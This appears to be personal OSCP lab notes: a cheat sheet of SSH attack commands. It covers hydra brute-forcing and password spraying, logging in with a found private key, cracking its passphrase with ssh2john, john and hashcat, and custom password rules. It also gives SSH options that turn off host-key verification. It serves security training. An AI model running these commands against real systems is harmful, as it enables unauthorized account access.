# SSH

```bash
ls -1 /usr/share/nmap/scripts/ssh
sudo nmap -p 22 --script ssh-auth-methods 192.168.IP
```


## Brute Force
```bash
# Try Default Creds, think admin:admin, root:calvin
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -s port ssh://<IP>  -I

# Password brute-force using Hydra.
hydra -t 4 -V -l <username> -P <password-list> -s <ssh-port> ssh://<target-ip>
# Password spraying using Hydra.
hydra -t 4 -V -L <username-list> -p <password> -s <ssh-port> ssh://<target-ip>
hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 22 -o "./scans/ssh_hydra.txt" ssh://IP
# -e nsr : do extra password check, name as password, reverse, etc..
# -t 4 : thread count 4

# remove comments/ fix john password list for hydra use, 
sed '/^#/d' /usr/share/john/password.lst > clean_passwd.lst
```
## SSH Private Key Passphrase
- Often found via WWW Directory Traversal 
```bash
# connect with id_rsa
chmod 600 id_rsa                 # Set permissions on our found SSH PRIV KEY
ssh -i id_rsa dave@192.168.IP -p 2222  

### Cracking SSH Priv Key passphrase
# 1. convert id_rsa hash to john format
ssh2john id_rsa > ssh.hash   
john --wordlist=/home/kali/Wordlists/rockyou.txt hash

# For HASHCAT, with text editor, remove any leading filenames before $6 in file ssh.hash
# For John, the file should be g2g

# find correct -m mode to use
hashcat -h | grep -i "ssh"      
hashcat -m 22921 ssh.hash ssh.passwords  --force

### Custom Rule SET password policy
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force

# if hashcat throws an error, use john instead
john --wordlist=ssh.passwords --rules=[CUSTOM_RULE_GOES_HERE] ssh.hash

###Updating /etc/john/john.conf for custom RULE list
# 3 numbers, A cap Passwords need 3 numbers, a capital letter and a special character
# ssh.rule :  a password 'word' and convert it to 'Word000!' 'Word000@' 'Word000# 'Word001!' etc
[List.Rules:sshPWKRules]
c $[0-9] $[0-9] $[0-9] $!
c $[0-9] $[0-9] $[0-9] $@
c $[0-9] $[0-9] $[0-9] $#

# append john.conf
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'

### Create customized password list from rule set
john --wordlist=ssh.passwords --rules=sshPWKRules --stdout > chp16passwords.txt
```

## OSCP SSH switches
* Do to re-use of IPs/hosts in the course, there is a **Recommended Syntax for Module VMS**
* These  options have been added to prevent the known-hosts file from  being corrupted
	* `~/.ssh/known_hosts`
* The reason we use these options is to eliminate our known-hosts file from identifying mismatched machine info when we revert lab machines. 
* `ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" learner@192.168.50.52`
		* `UserKnownHostsFile=/dev/null`  - Prevents the server host key from being recorded
		* `StrictHostKeyChecking=no`         - Do *NOT* verify the authenticity of the server host key
```bash
# connect 
ssh -i alfred_id_rsa alfred@192.168.110.201 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -p 2222  
```
